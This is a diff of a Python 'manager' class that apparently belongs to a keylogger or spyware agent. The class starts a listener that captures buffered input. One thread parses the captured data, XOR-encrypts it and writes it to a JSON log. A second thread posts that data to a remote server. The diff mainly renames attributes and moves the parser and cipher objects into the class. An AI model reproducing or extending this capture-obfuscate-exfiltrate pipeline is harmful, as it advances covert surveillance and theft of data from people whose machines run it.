@@ -9,33 +9,29 @@ from threading import Thread
 from agent_network.send_json import post_json
 from config.config import write_delay, send_json_delay 
 
-parser=Parser()
-xor=Xor()
+
  
 
 
 class manager:
     def __init__(self):
-        self.l = Listener()
-        self.wr = ConsoleLog()
-        self.wr2 = FileLog()
-        self.json = JsonLog()
+        self.listenr = Listener()
+        self.consoel_writer = ConsoleLog()
+        self.file_writer = FileLog()
+        self.json_writer = JsonLog()
+        self.Parser = Parser()
+        self.xor = Xor()
+
 
     def write_data(self):
         while True:
             sleep(write_delay) 
-            # > 0 
-            if self.l.buffer_has_data()>0:
-                buffer = self.l.get_buffer()
-                # preser the list -> str
-                print(buffer)
-                parser_buffer=parser.clean_and_join(buffer)
-                # encript the str 
-                encBuffer=xor.encrypt(parser_buffer)
-                # write -> json
-                self.json.write(parser_buffer)
-                
-                print(parser_buffer)
+            if self.listenr.buffer_has_data():
+                buffer = self.listenr.get_buffer()
+                parser_buffer = self.Parser.parse_data(buffer) # preser the list -> str
+                enc_buffer = self.xor.encrypt(parser_buffer) # encript the str 
+                self.json_writer.write(enc_buffer) # write -> json
+            
 
 
     def send_json(self):
@@ -45,9 +41,9 @@ class manager:
 
 
     def main(self):
-        self.l.start() ## start listening
+        self.listenr.start() ## start listening
         Thread(target=self.write_data, daemon=True).start() ## writeing local json thred
         Thread(target=self.send_json, daemon=True).start() ## send json to server thread
-        self.l.stop() ## stop listening
+        self.listenr.stop() ## stop listening
 
 
